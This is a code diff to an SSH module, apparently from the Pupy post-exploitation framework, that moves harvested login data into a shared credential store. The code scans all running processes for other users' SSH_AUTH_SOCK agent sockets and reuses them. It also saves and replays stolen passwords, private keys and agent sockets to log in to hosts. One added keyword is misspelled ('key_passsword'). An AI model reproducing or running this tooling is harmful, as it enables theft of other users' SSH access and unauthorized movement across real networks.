@@ -52,24 +52,14 @@ from hashlib import md5
 from base64 import b64encode
 
 from network.lib.scan import scanthread_parse
+from network.lib.netcreds import add_cred, find_creds
 
 from rpyc import async
 
 Transport._CLIENT_ID = 'OpenSSH'
 
-SUCCESS_CACHE = {}
-
 try:
-    import pupy
     from pupy import obtain
-
-    if not hasattr(pupy, 'creds_cache'):
-        setattr(pupy, 'creds_cache', {})
-
-    if 'ssh' not in pupy.creds_cache:
-        pupy.creds_cache['ssh'] = {}
-
-    SUCCESS_CACHE = pupy.creds_cache['ssh']
 
 except ImportError:
     def obtain(x):
@@ -403,13 +393,21 @@ class SSH(object):
             self.port = 22
 
         self._connect()
-        if self.connected:
-            SUCCESS_CACHE[frozenset((self.host, self.port, self.user))] = self._success_args
+        if self.connected and self._success_args:
+            add_cred(
+                self.user, schema='ssh', port=self.port,
+                hostname=self.host,
+                agent_socket=self._success_args.get('agent_socket'),
+                auto=self._success_args.get('auto'),
+                pkey=self._success_args.get('pkey'),
+                key_file=self._success_args.get('key_file'),
+                key_passsword=self._success_args.get('key_password'),
+            )
 
     @property
     def success_args(self):
         return tuple([self._success_args.get(x, None) for x in (
-            'host', 'port', 'user', 'password', 'key_password', 'key',
+            'hostname', 'port', 'user', 'password', 'key_password', 'key',
             'key_file', 'agent_socket', 'auto', 'cached'
         )])
 
@@ -424,15 +422,15 @@ class SSH(object):
 
         for process in process_iter():
             try:
-                info = process.as_dict(['environ'])
+                info = process.as_dict(['username', 'environ'])
             except OSError:
                 continue
 
             if 'environ' not in info or info['environ'] is None:
                 continue
 
-            if 'SSH_AUTH_SOCK' in info['environ']:
-                pair = (info['username'], info['environ']['SSH_AUTH_SOCK'])
+            if 'SSH_AUTH_SOCK' in info.get('environ'):
+                pair = (info.get('username'), info.get('environ').get('SSH_AUTH_SOCK'))
                 if pair in pairs:
                     continue
 
@@ -831,16 +829,14 @@ class SSH(object):
         client.load_system_host_keys()
 
         # 0. If host in SUCCESS_CACHE try this first
-        success_cache_key = frozenset((self.host, self.port, self.user))
-        if success_cache_key in SUCCESS_CACHE:
-            auth_info = SUCCESS_CACHE.get(success_cache_key)
-            if auth_info.get('password'):
+        for cred in find_creds(username=self.user, schema='ssh', port=self.port, address=self.host):
+            if cred.password:
                 try:
                     client.connect(
-                        password=auth_info['password'],
+                        password=cred.password,
                         hostname=self.host,
                         port=self.port,
-                        username=auth_info['user'],
+                        username=cred.user,
                         allow_agent=False,
                         look_for_keys=False,
                         gss_auth=False,
@@ -849,22 +845,25 @@ class SSH(object):
                     )
 
                     self._client = client
-                    self._success_args = auth_info
-                    self._success_args['cached'] = True
+                    self._success_args = cred.as_dict()
+                    self._success_args.update({
+                        'hostname': self.host,
+                        'port': self.port,
+                    })
                     return True
 
                 except SSHException:
                     client.close()
 
-            elif auth_info.get('agent_socket'):
+            elif cred.agent_socket:
                 SSH_AUTH_SOCK_bak = environ.get('SSH_AUTH_SOCK', None)
-                environ['SSH_AUTH_SOCK'] = auth_info['agent_socket']
+                environ['SSH_AUTH_SOCK'] = cred.agent_socket
 
                 try:
                     client.connect(
                         hostname=self.host,
                         port=self.port,
-                        username=auth_info['user'],
+                        username=cred.user,
                         allow_agent=True,
                         look_for_keys=False,
                         password=None,
@@ -873,8 +872,11 @@ class SSH(object):
                     )
 
                     self._client = client
-                    self._success_args = auth_info
-                    self._success_args['cached'] = True
+                    self._success_args = cred.as_dict()
+                    self._success_args.update({
+                        'hostname': self.host,
+                        'port': self.port
+                    })
                     return True
 
                 except SSHException:
@@ -886,13 +888,13 @@ class SSH(object):
                     else:
                         environ['SSH_AUTH_SOCK'] = SSH_AUTH_SOCK_bak
 
-            elif auth_info.get('pkey'):
+            elif cred.pkey:
                 try:
                     client.connect(
                         hostname=self.host,
                         port=self.port,
-                        username=auth_info['user'],
-                        pkey=auth_info['pkey'],
+                        username=cred.user,
+                        pkey=cred.pkey,
                         allow_agent=False,
                         look_for_keys=False,
                         gss_auth=False,
@@ -901,8 +903,11 @@ class SSH(object):
                     )
 
                     self._client = client
-                    self._success_args = auth_info
-                    self._success_args['cached'] = True
+                    self._success_args = cred.as_dict()
+                    self._success_args.update({
+                        'hostname': self.host,
+                        'port': self.port
+                    })
                     return True
 
                 except SSHException:
@@ -930,7 +935,7 @@ class SSH(object):
 
                     self._client = client
                     self._success_args = {
-                        'host': self.host,
+                        'hostname': self.host,
                         'port': self.port,
                         'user': username,
                         'password': password,
@@ -964,7 +969,7 @@ class SSH(object):
 
                 self._client = client
                 self._success_args = {
-                    'host': self.host,
+                    'hostname': self.host,
                     'port': self.port,
                     'user': username,
                     'agent_socket': SSH_AUTH_SOCK,
@@ -1024,7 +1029,7 @@ class SSH(object):
 
                 self._client = client
                 self._success_args = {
-                    'host': self.host,
+                    'hostname': self.host,
                     'port': self.port,
                     'user': username,
                     'key': key_data,
